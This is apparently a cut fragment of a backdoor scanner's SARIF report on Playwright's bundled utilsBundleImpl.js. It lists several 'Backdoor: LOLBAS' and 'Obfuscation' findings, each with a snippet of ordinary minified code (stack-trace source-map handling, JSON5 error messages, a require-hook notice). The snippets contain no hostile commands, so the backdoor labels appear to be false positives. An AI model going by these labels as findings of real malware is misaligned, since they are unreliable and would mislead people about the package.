                      "markdown": "`=function(){return o.source},r}var l=r.isEval()&&r.getEvalOrigin();return l&&(l=qn(l),r=Hn(r),r.getEvalOrigin=function(){return l}),r}function Tc(r,e){ei&&(Xe={},Ft={});for(var t=r.name||\"Error\",i=r.message||\"\",s=t+\": \"+i,n={nextPosition:null,curPosition:null},u=[],o=e.length-1;o>=0;o--)u.push(`\n    at `+jn(e[o],n)),n.nextPosition=n.curPosition;return n.curPosition=n.nextPosition=null,s+u.reverse().join(\"\")}function Gn(r){var e=/\\n    at [^(]+ \\((.*):(\\d+):(\\d+)\\)/.exec(r.stack);if(e){var t=e[1],i=+e[2],s=+e[3],n=Xe[t];if(!n&&Be&&Be.existsSync(t))try{n=Be.readFileSync(t,\"utf8\")}catch{n=\"\"}if(n){va`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 31767,
                  "endLine": 16,
                  "endColumn": 31771,
                  "snippet": {
                    "text": "!==null)return i.source=ti(e.url,i.source),i}return r}function qn(r){var e=/^eval at ([^(]+) \\((.+):(\\d+):(\\d+)\\)$/.exec(r);if(e){var t=ui({source:e[2],line:+e[3],column:e[4]-1});return\"eval at \"+e[1]+\" (\"+t.source+\":\"+t.line+\":\"+(t.column+1)+\")\"}return e=/^eval at ([^(]+) \\((.+)\\)$/.exec(r),e?\"eval at \"+e[1]+\" (\"+qn(e[2])+\")\":r}function Lc(){var r,e=\"\";if(this.isNative())e=\"native\";else{r=this.getScriptNameOrSourceURL(),!r&&this.isEval()&&(e=this.getEvalOrigin(),e+=\", \"),r?e+=r:e+=\"<anonymous>\";var t=this.getLineNumber();if(t!=null){e+=\":\"+t;var i=this.getColumnNumber();i&&(e+=\":\"+i)}}var s=\"\",n=",
                    "rendered": {
                      "text": "!==null)return i.source=ti(e.url,i.source),i}return r}function qn(r){var e=/^eval at ([^(]+) \\((.+):(\\d+):(\\d+)\\)$/.exec(r);if(e){var t=ui({source:e[2],line:+e[3],column:e[4]-1});return\"eval at \"+e[1]+\" (\"+t.source+\":\"+t.line+\":\"+(t.column+1)+\")\"}return e=/^eval at ([^(]+) \\((.+)\\)$/.exec(r),e?\"eval at \"+e[1]+\" (\"+qn(e[2])+\")\":r}function Lc(){var r,e=\"\";if(this.isNative())e=\"native\";else{r=this.getScriptNameOrSourceURL(),!r&&this.isEval()&&(e=this.getEvalOrigin(),e+=\", \"),r?e+=r:e+=\"<anonymous>\";var t=this.getLineNumber();if(t!=null){e+=\":\"+t;var i=this.getColumnNumber();i&&(e+=\":\"+i)}}var s=\"\",n=",
                      "markdown": "`!==null)return i.source=ti(e.url,i.source),i}return r}function qn(r){var e=/^eval at ([^(]+) \\((.+):(\\d+):(\\d+)\\)$/.exec(r);if(e){var t=ui({source:e[2],line:+e[3],column:e[4]-1});return\"eval at \"+e[1]+\" (\"+t.source+\":\"+t.line+\":\"+(t.column+1)+\")\"}return e=/^eval at ([^(]+) \\((.+)\\)$/.exec(r),e?\"eval at \"+e[1]+\" (\"+qn(e[2])+\")\":r}function Lc(){var r,e=\"\";if(this.isNative())e=\"native\";else{r=this.getScriptNameOrSourceURL(),!r&&this.isEval()&&(e=this.getEvalOrigin(),e+=\", \"),r?e+=r:e+=\"<anonymous>\";var t=this.getLineNumber();if(t!=null){e+=\":\"+t;var i=this.getColumnNumber();i&&(e+=\":\"+i)}}var s=\"\",n=`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 31729,
                  "endLine": 16,
                  "endColumn": 31733,
                  "snippet": {
                    "text": "map.originalPositionFor(r);if(i.source!==null)return i.source=ti(e.url,i.source),i}return r}function qn(r){var e=/^eval at ([^(]+) \\((.+):(\\d+):(\\d+)\\)$/.exec(r);if(e){var t=ui({source:e[2],line:+e[3],column:e[4]-1});return\"eval at \"+e[1]+\" (\"+t.source+\":\"+t.line+\":\"+(t.column+1)+\")\"}return e=/^eval at ([^(]+) \\((.+)\\)$/.exec(r),e?\"eval at \"+e[1]+\" (\"+qn(e[2])+\")\":r}function Lc(){var r,e=\"\";if(this.isNative())e=\"native\";else{r=this.getScriptNameOrSourceURL(),!r&&this.isEval()&&(e=this.getEvalOrigin(),e+=\", \"),r?e+=r:e+=\"<anonymous>\";var t=this.getLineNumber();if(t!=null){e+=\":\"+t;var i=this.getCol",
                    "rendered": {
                      "text": "map.originalPositionFor(r);if(i.source!==null)return i.source=ti(e.url,i.source),i}return r}function qn(r){var e=/^eval at ([^(]+) \\((.+):(\\d+):(\\d+)\\)$/.exec(r);if(e){var t=ui({source:e[2],line:+e[3],column:e[4]-1});return\"eval at \"+e[1]+\" (\"+t.source+\":\"+t.line+\":\"+(t.column+1)+\")\"}return e=/^eval at ([^(]+) \\((.+)\\)$/.exec(r),e?\"eval at \"+e[1]+\" (\"+qn(e[2])+\")\":r}function Lc(){var r,e=\"\";if(this.isNative())e=\"native\";else{r=this.getScriptNameOrSourceURL(),!r&&this.isEval()&&(e=this.getEvalOrigin(),e+=\", \"),r?e+=r:e+=\"<anonymous>\";var t=this.getLineNumber();if(t!=null){e+=\":\"+t;var i=this.getCol",
                      "markdown": "`map.originalPositionFor(r);if(i.source!==null)return i.source=ti(e.url,i.source),i}return r}function qn(r){var e=/^eval at ([^(]+) \\((.+):(\\d+):(\\d+)\\)$/.exec(r);if(e){var t=ui({source:e[2],line:+e[3],column:e[4]-1});return\"eval at \"+e[1]+\" (\"+t.source+\":\"+t.line+\":\"+(t.column+1)+\")\"}return e=/^eval at ([^(]+) \\((.+)\\)$/.exec(r),e?\"eval at \"+e[1]+\" (\"+qn(e[2])+\")\":r}function Lc(){var r,e=\"\";if(this.isNative())e=\"native\";else{r=this.getScriptNameOrSourceURL(),!r&&this.isEval()&&(e=this.getEvalOrigin(),e+=\", \"),r?e+=r:e+=\"<anonymous>\";var t=this.getLineNumber();if(t!=null){e+=\":\"+t;var i=this.getCol`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 31657,
                  "endLine": 16,
                  "endColumn": 31661,
                  "snippet": {
                    "text": "ull}}if(e&&e.map&&typeof e.map.originalPositionFor==\"function\"){var i=e.map.originalPositionFor(r);if(i.source!==null)return i.source=ti(e.url,i.source),i}return r}function qn(r){var e=/^eval at ([^(]+) \\((.+):(\\d+):(\\d+)\\)$/.exec(r);if(e){var t=ui({source:e[2],line:+e[3],column:e[4]-1});return\"eval at \"+e[1]+\" (\"+t.source+\":\"+t.line+\":\"+(t.column+1)+\")\"}return e=/^eval at ([^(]+) \\((.+)\\)$/.exec(r),e?\"eval at \"+e[1]+\" (\"+qn(e[2])+\")\":r}function Lc(){var r,e=\"\";if(this.isNative())e=\"native\";else{r=this.getScriptNameOrSourceURL(),!r&&this.isEval()&&(e=this.getEvalOrigin(),e+=\", \"),r?e+=r:e+=\"<anony",
                    "rendered": {
                      "text": "ull}}if(e&&e.map&&typeof e.map.originalPositionFor==\"function\"){var i=e.map.originalPositionFor(r);if(i.source!==null)return i.source=ti(e.url,i.source),i}return r}function qn(r){var e=/^eval at ([^(]+) \\((.+):(\\d+):(\\d+)\\)$/.exec(r);if(e){var t=ui({source:e[2],line:+e[3],column:e[4]-1});return\"eval at \"+e[1]+\" (\"+t.source+\":\"+t.line+\":\"+(t.column+1)+\")\"}return e=/^eval at ([^(]+) \\((.+)\\)$/.exec(r),e?\"eval at \"+e[1]+\" (\"+qn(e[2])+\")\":r}function Lc(){var r,e=\"\";if(this.isNative())e=\"native\";else{r=this.getScriptNameOrSourceURL(),!r&&this.isEval()&&(e=this.getEvalOrigin(),e+=\", \"),r?e+=r:e+=\"<anony",
                      "markdown": "`ull}}if(e&&e.map&&typeof e.map.originalPositionFor==\"function\"){var i=e.map.originalPositionFor(r);if(i.source!==null)return i.source=ti(e.url,i.source),i}return r}function qn(r){var e=/^eval at ([^(]+) \\((.+):(\\d+):(\\d+)\\)$/.exec(r);if(e){var t=ui({source:e[2],line:+e[3],column:e[4]-1});return\"eval at \"+e[1]+\" (\"+t.source+\":\"+t.line+\":\"+(t.column+1)+\")\"}return e=/^eval at ([^(]+) \\((.+)\\)$/.exec(r),e?\"eval at \"+e[1]+\" (\"+qn(e[2])+\")\":r}function Lc(){var r,e=\"\";if(this.isNative())e=\"native\";else{r=this.getScriptNameOrSourceURL(),!r&&this.isEval()&&(e=this.getEvalOrigin(),e+=\", \"),r?e+=r:e+=\"<anony`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 31548,
                  "endLine": 16,
                  "endColumn": 31552,
                  "snippet": {
                    "text": "unction(s,n){var u=e.map.sourcesContent[n];if(u){var o=ti(e.url,s);Xe[o]=u}})):e=Ft[r.source]={url:null,map:null}}if(e&&e.map&&typeof e.map.originalPositionFor==\"function\"){var i=e.map.originalPositionFor(r);if(i.source!==null)return i.source=ti(e.url,i.source),i}return r}function qn(r){var e=/^eval at ([^(]+) \\((.+):(\\d+):(\\d+)\\)$/.exec(r);if(e){var t=ui({source:e[2],line:+e[3],column:e[4]-1});return\"eval at \"+e[1]+\" (\"+t.source+\":\"+t.line+\":\"+(t.column+1)+\")\"}return e=/^eval at ([^(]+) \\((.+)\\)$/.exec(r),e?\"eval at \"+e[1]+\" (\"+qn(e[2])+\")\":r}function Lc(){var r,e=\"\";if(this.isNative())e=\"native\"",
                    "rendered": {
                      "text": "unction(s,n){var u=e.map.sourcesContent[n];if(u){var o=ti(e.url,s);Xe[o]=u}})):e=Ft[r.source]={url:null,map:null}}if(e&&e.map&&typeof e.map.originalPositionFor==\"function\"){var i=e.map.originalPositionFor(r);if(i.source!==null)return i.source=ti(e.url,i.source),i}return r}function qn(r){var e=/^eval at ([^(]+) \\((.+):(\\d+):(\\d+)\\)$/.exec(r);if(e){var t=ui({source:e[2],line:+e[3],column:e[4]-1});return\"eval at \"+e[1]+\" (\"+t.source+\":\"+t.line+\":\"+(t.column+1)+\")\"}return e=/^eval at ([^(]+) \\((.+)\\)$/.exec(r),e?\"eval at \"+e[1]+\" (\"+qn(e[2])+\")\":r}function Lc(){var r,e=\"\";if(this.isNative())e=\"native\"",
                      "markdown": "`unction(s,n){var u=e.map.sourcesContent[n];if(u){var o=ti(e.url,s);Xe[o]=u}})):e=Ft[r.source]={url:null,map:null}}if(e&&e.map&&typeof e.map.originalPositionFor==\"function\"){var i=e.map.originalPositionFor(r);if(i.source!==null)return i.source=ti(e.url,i.source),i}return r}function qn(r){var e=/^eval at ([^(]+) \\((.+):(\\d+):(\\d+)\\)$/.exec(r);if(e){var t=ui({source:e[2],line:+e[3],column:e[4]-1});return\"eval at \"+e[1]+\" (\"+t.source+\":\"+t.line+\":\"+(t.column+1)+\")\"}return e=/^eval at ([^(]+) \\((.+)\\)$/.exec(r),e?\"eval at \"+e[1]+\" (\"+qn(e[2])+\")\":r}function Lc(){var r,e=\"\";if(this.isNative())e=\"native\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 470,
                  "endLine": 14,
                  "endColumn": 474,
                  "snippet": {
                    "text": "r,\"__esModule\",{value:!0});Mr.addHook=Jl;var Yl=ln(require(\"module\")),an=ln(require(\"path\"));function ln(r){return r&&r.__esModule?r:{default:r}}var Ql=/^(?:.*[\\\\/])?node_modules(?:[\\\\/].*)?$/,ut=kr.constructor.length>1?kr.constructor:Yl.default,Xl=`[Pirates] A hook returned a non-string, or nothing at all! This is a violation of intergalactic law!\n--------------------\nIf you have no idea what this means or what Pirates is, let me explain: Pirates is a module that makes is easy to implement require hooks. One of the require hooks you're using uses it. One of these require hooks didn't return anyth",
                    "rendered": {
                      "text": "r,\"__esModule\",{value:!0});Mr.addHook=Jl;var Yl=ln(require(\"module\")),an=ln(require(\"path\"));function ln(r){return r&&r.__esModule?r:{default:r}}var Ql=/^(?:.*[\\\\/])?node_modules(?:[\\\\/].*)?$/,ut=kr.constructor.length>1?kr.constructor:Yl.default,Xl=`[Pirates] A hook returned a non-string, or nothing at all! This is a violation of intergalactic law!\n--------------------\nIf you have no idea what this means or what Pirates is, let me explain: Pirates is a module that makes is easy to implement require hooks. One of the require hooks you're using uses it. One of these require hooks didn't return anyth",
                      "markdown": "`r,\"__esModule\",{value:!0});Mr.addHook=Jl;var Yl=ln(require(\"module\")),an=ln(require(\"path\"));function ln(r){return r&&r.__esModule?r:{default:r}}var Ql=/^(?:.*[\\\\/])?node_modules(?:[\\\\/].*)?$/,ut=kr.constructor.length>1?kr.constructor:Yl.default,Xl=`[Pirates] A hook returned a non-string, or nothing at all! This is a violation of intergalactic law!\n--------------------\nIf you have no idea what this means or what Pirates is, let me explain: Pirates is a module that makes is easy to implement require hooks. One of the require hooks you're using uses it. One of these require hooks didn't return anyth`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 2067,
                  "endLine": 8,
                  "endColumn": 2071,
                  "snippet": {
                    "text": "alue\":fe=\"afterPropertyValue\"}function z(r){return Yt(r===void 0?`JSON5: invalid end of input at ${He}:${we}`:`JSON5: invalid character '${en(r)}' at ${He}:${we}`)}function Ke(){return Yt(`JSON5: invalid end of input at ${He}:${we}`)}function Zs(){return we-=5,Yt(`JSON5: invalid identifier character at ${He}:${we}`)}function Ul(r){console.warn(`JSON5: '${en(r)}' in strings is not valid ECMAScript; consider escaping`)}function en(r){let e={\"'\":\"\\\\'\",'\"':'\\\\\"',\"\\\\\":\"\\\\\\\\\",\"\\b\":\"\\\\b\",\"\\f\":\"\\\\f\",\"\\n\":\"\\\\n\",\"\\r\":\"\\\\r\",\"\t\":\"\\\\t\",\"\\v\":\"\\\\v\",\"\\0\":\"\\\\0\",\"\\u2028\":\"\\\\u2028\",\"\\u2029\":\"\\\\u2029\"};if(e[r])return",
                    "rendered": {
                      "text": "alue\":fe=\"afterPropertyValue\"}function z(r){return Yt(r===void 0?`JSON5: invalid end of input at ${He}:${we}`:`JSON5: invalid character '${en(r)}' at ${He}:${we}`)}function Ke(){return Yt(`JSON5: invalid end of input at ${He}:${we}`)}function Zs(){return we-=5,Yt(`JSON5: invalid identifier character at ${He}:${we}`)}function Ul(r){console.warn(`JSON5: '${en(r)}' in strings is not valid ECMAScript; consider escaping`)}function en(r){let e={\"'\":\"\\\\'\",'\"':'\\\\\"',\"\\\\\":\"\\\\\\\\\",\"\\b\":\"\\\\b\",\"\\f\":\"\\\\f\",\"\\n\":\"\\\\n\",\"\\r\":\"\\\\r\",\"\t\":\"\\\\t\",\"\\v\":\"\\\\v\",\"\\0\":\"\\\\0\",\"\\u2028\":\"\\\\u2028\",\"\\u2029\":\"\\\\u2029\"};if(e[r])return",
                      "markdown": "`alue\":fe=\"afterPropertyValue\"}function z(r){return Yt(r===void 0?`JSON5: invalid end of input at ${He}:${we}`:`JSON5: invalid character '${en(r)}' at ${He}:${we}`)}function Ke(){return Yt(`JSON5: invalid end of input at ${He}:${we}`)}function Zs(){return we-=5,Yt(`JSON5: invalid identifier character at ${He}:${we}`)}function Ul(r){console.warn(`JSON5: '${en(r)}' in strings is not valid ECMAScript; consider escaping`)}function en(r){let e={\"'\":\"\\\\'\",'\"':'\\\\\"',\"\\\\\":\"\\\\\\\\\",\"\\b\":\"\\\\b\",\"\\f\":\"\\\\f\",\"\\n\":\"\\\\n\",\"\\r\":\"\\\\r\",\"\t\":\"\\\\t\",\"\\v\":\"\\\\v\",\"\\0\":\"\\\\0\",\"\\u2028\":\"\\\\u2028\",\"\\u2029\":\"\\\\u2029\"};if(e[r])return`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 1983,
                  "endLine": 8,
                  "endColumn": 1987,
                  "snippet": {
                    "text": "t(){Te.pop();let r=Te[Te.length-1];r==null?fe=\"end\":Array.isArray(r)?fe=\"afterArrayValue\":fe=\"afterPropertyValue\"}function z(r){return Yt(r===void 0?`JSON5: invalid end of input at ${He}:${we}`:`JSON5: invalid character '${en(r)}' at ${He}:${we}`)}function Ke(){return Yt(`JSON5: invalid end of input at ${He}:${we}`)}function Zs(){return we-=5,Yt(`JSON5: invalid identifier character at ${He}:${we}`)}function Ul(r){console.warn(`JSON5: '${en(r)}' in strings is not valid ECMAScript; consider escaping`)}function en(r){let e={\"'\":\"\\\\'\",'\"':'\\\\\"',\"\\\\\":\"\\\\\\\\\",\"\\b\":\"\\\\b\",\"\\f\":\"\\\\f\",\"\\n\":\"\\\\n\",\"\\r\":\"\\\\r\",\"",
                    "rendered": {
                      "text": "t(){Te.pop();let r=Te[Te.length-1];r==null?fe=\"end\":Array.isArray(r)?fe=\"afterArrayValue\":fe=\"afterPropertyValue\"}function z(r){return Yt(r===void 0?`JSON5: invalid end of input at ${He}:${we}`:`JSON5: invalid character '${en(r)}' at ${He}:${we}`)}function Ke(){return Yt(`JSON5: invalid end of input at ${He}:${we}`)}function Zs(){return we-=5,Yt(`JSON5: invalid identifier character at ${He}:${we}`)}function Ul(r){console.warn(`JSON5: '${en(r)}' in strings is not valid ECMAScript; consider escaping`)}function en(r){let e={\"'\":\"\\\\'\",'\"':'\\\\\"',\"\\\\\":\"\\\\\\\\\",\"\\b\":\"\\\\b\",\"\\f\":\"\\\\f\",\"\\n\":\"\\\\n\",\"\\r\":\"\\\\r\",\"",
                      "markdown": "`t(){Te.pop();let r=Te[Te.length-1];r==null?fe=\"end\":Array.isArray(r)?fe=\"afterArrayValue\":fe=\"afterPropertyValue\"}function z(r){return Yt(r===void 0?`JSON5: invalid end of input at ${He}:${we}`:`JSON5: invalid character '${en(r)}' at ${He}:${we}`)}function Ke(){return Yt(`JSON5: invalid end of input at ${He}:${we}`)}function Zs(){return we-=5,Yt(`JSON5: invalid identifier character at ${He}:${we}`)}function Ul(r){console.warn(`JSON5: '${en(r)}' in strings is not valid ECMAScript; consider escaping`)}function en(r){let e={\"'\":\"\\\\'\",'\"':'\\\\\"',\"\\\\\":\"\\\\\\\\\",\"\\b\":\"\\\\b\",\"\\f\":\"\\\\f\",\"\\n\":\"\\\\n\",\"\\r\":\"\\\\r\",\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 1913,
                  "endLine": 8,
                  "endColumn": 1917,
                  "snippet": {
                    "text": "ay.isArray(e)?fe=\"afterArrayValue\":fe=\"afterPropertyValue\"}}function Vt(){Te.pop();let r=Te[Te.length-1];r==null?fe=\"end\":Array.isArray(r)?fe=\"afterArrayValue\":fe=\"afterPropertyValue\"}function z(r){return Yt(r===void 0?`JSON5: invalid end of input at ${He}:${we}`:`JSON5: invalid character '${en(r)}' at ${He}:${we}`)}function Ke(){return Yt(`JSON5: invalid end of input at ${He}:${we}`)}function Zs(){return we-=5,Yt(`JSON5: invalid identifier character at ${He}:${we}`)}function Ul(r){console.warn(`JSON5: '${en(r)}' in strings is not valid ECMAScript; consider escaping`)}function en(r){let e={\"'\":\"\\\\",
                    "rendered": {
                      "text": "ay.isArray(e)?fe=\"afterArrayValue\":fe=\"afterPropertyValue\"}}function Vt(){Te.pop();let r=Te[Te.length-1];r==null?fe=\"end\":Array.isArray(r)?fe=\"afterArrayValue\":fe=\"afterPropertyValue\"}function z(r){return Yt(r===void 0?`JSON5: invalid end of input at ${He}:${we}`:`JSON5: invalid character '${en(r)}' at ${He}:${we}`)}function Ke(){return Yt(`JSON5: invalid end of input at ${He}:${we}`)}function Zs(){return we-=5,Yt(`JSON5: invalid identifier character at ${He}:${we}`)}function Ul(r){console.warn(`JSON5: '${en(r)}' in strings is not valid ECMAScript; consider escaping`)}function en(r){let e={\"'\":\"\\\\",
                      "markdown": "`ay.isArray(e)?fe=\"afterArrayValue\":fe=\"afterPropertyValue\"}}function Vt(){Te.pop();let r=Te[Te.length-1];r==null?fe=\"end\":Array.isArray(r)?fe=\"afterArrayValue\":fe=\"afterPropertyValue\"}function z(r){return Yt(r===void 0?`JSON5: invalid end of input at ${He}:${we}`:`JSON5: invalid character '${en(r)}' at ${He}:${we}`)}function Ke(){return Yt(`JSON5: invalid end of input at ${He}:${we}`)}function Zs(){return we-=5,Yt(`JSON5: invalid identifier character at ${He}:${we}`)}function Ul(r){console.warn(`JSON5: '${en(r)}' in strings is not valid ECMAScript; consider escaping`)}function en(r){let e={\"'\":\"\\\\`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 1860,
                  "endLine": 8,
                  "endColumn": 1864,
                  "snippet": {
                    "text": "Name\";else{let e=Te[Te.length-1];e==null?fe=\"end\":Array.isArray(e)?fe=\"afterArrayValue\":fe=\"afterPropertyValue\"}}function Vt(){Te.pop();let r=Te[Te.length-1];r==null?fe=\"end\":Array.isArray(r)?fe=\"afterArrayValue\":fe=\"afterPropertyValue\"}function z(r){return Yt(r===void 0?`JSON5: invalid end of input at ${He}:${we}`:`JSON5: invalid character '${en(r)}' at ${He}:${we}`)}function Ke(){return Yt(`JSON5: invalid end of input at ${He}:${we}`)}function Zs(){return we-=5,Yt(`JSON5: invalid identifier character at ${He}:${we}`)}function Ul(r){console.warn(`JSON5: '${en(r)}' in strings is not valid ECMAScri",
                    "rendered": {
                      "text": "Name\";else{let e=Te[Te.length-1];e==null?fe=\"end\":Array.isArray(e)?fe=\"afterArrayValue\":fe=\"afterPropertyValue\"}}function Vt(){Te.pop();let r=Te[Te.length-1];r==null?fe=\"end\":Array.isArray(r)?fe=\"afterArrayValue\":fe=\"afterPropertyValue\"}function z(r){return Yt(r===void 0?`JSON5: invalid end of input at ${He}:${we}`:`JSON5: invalid character '${en(r)}' at ${He}:${we}`)}function Ke(){return Yt(`JSON5: invalid end of input at ${He}:${we}`)}function Zs(){return we-=5,Yt(`JSON5: invalid identifier character at ${He}:${we}`)}function Ul(r){console.warn(`JSON5: '${en(r)}' in strings is not valid ECMAScri",
                      "markdown": "`Name\";else{let e=Te[Te.length-1];e==null?fe=\"end\":Array.isArray(e)?fe=\"afterArrayValue\":fe=\"afterPropertyValue\"}}function Vt(){Te.pop();let r=Te[Te.length-1];r==null?fe=\"end\":Array.isArray(r)?fe=\"afterArrayValue\":fe=\"afterPropertyValue\"}function z(r){return Yt(r===void 0?`JSON5: invalid end of input at ${He}:${we}`:`JSON5: invalid character '${en(r)}' at ${He}:${we}`)}function Ke(){return Yt(`JSON5: invalid end of input at ${He}:${we}`)}function Zs(){return we-=5,Yt(`JSON5: invalid identifier character at ${He}:${we}`)}function Ul(r){console.warn(`JSON5: '${en(r)}' in strings is not valid ECMAScri`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 1924,
                  "endLine": 16,
                  "endColumn": 1932,
                  "snippet": {
                    "text": "qr.encode=function(e){var t=\"\",i,s=ec(e);do i=s&Dn,s>>>=Hr,s>0&&(i|=gn),t+=dn.encode(i);while(s>0);return t};qr.decode=function(e,t,i){var s=e.length,n=0,u=0,o,a;do{if(t>=s)throw new Error(\"Expected more digits in base 64 VLQ value.\");if(a=dn.decode(e.charCodeAt(t++)),a===-1)throw new Error(\"Invalid base64 digit: \"+e.charAt(t-1));o=!!(a&gn),a&=Dn,n=n+(a<<u),u+=Hr}while(o);i.value=tc(n),i.rest=t}});var lt=y(ae=>{function rc(r,e,t){if(e in r)return r[e];if(arguments.length===3)return t;throw new Error('\"'+e+'\" is a required argument.')}ae.getArg=rc;var mn=/^(?:([\\w+\\-.]+):)?\\/\\/(?:(\\w+:\\w+)@)?([\\w.-]*)(",
                    "rendered": {
                      "text": "qr.encode=function(e){var t=\"\",i,s=ec(e);do i=s&Dn,s>>>=Hr,s>0&&(i|=gn),t+=dn.encode(i);while(s>0);return t};qr.decode=function(e,t,i){var s=e.length,n=0,u=0,o,a;do{if(t>=s)throw new Error(\"Expected more digits in base 64 VLQ value.\");if(a=dn.decode(e.charCodeAt(t++)),a===-1)throw new Error(\"Invalid base64 digit: \"+e.charAt(t-1));o=!!(a&gn),a&=Dn,n=n+(a<<u),u+=Hr}while(o);i.value=tc(n),i.rest=t}});var lt=y(ae=>{function rc(r,e,t){if(e in r)return r[e];if(arguments.length===3)return t;throw new Error('\"'+e+'\" is a required argument.')}ae.getArg=rc;var mn=/^(?:([\\w+\\-.]+):)?\\/\\/(?:(\\w+:\\w+)@)?([\\w.-]*)(",
                      "markdown": "`qr.encode=function(e){var t=\"\",i,s=ec(e);do i=s&Dn,s>>>=Hr,s>0&&(i|=gn),t+=dn.encode(i);while(s>0);return t};qr.decode=function(e,t,i){var s=e.length,n=0,u=0,o,a;do{if(t>=s)throw new Error(\"Expected more digits in base 64 VLQ value.\");if(a=dn.decode(e.charCodeAt(t++)),a===-1)throw new Error(\"Invalid base64 digit: \"+e.charAt(t-1));o=!!(a&gn),a&=Dn,n=n+(a<<u),u+=Hr}while(o);i.value=tc(n),i.rest=t}});var lt=y(ae=>{function rc(r,e,t){if(e in r)return r[e];if(arguments.length===3)return t;throw new Error('\"'+e+'\" is a required argument.')}ae.getArg=rc;var mn=/^(?:([\\w+\\-.]+):)?\\/\\/(?:(\\w+:\\w+)@)?([\\w.-]*)(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
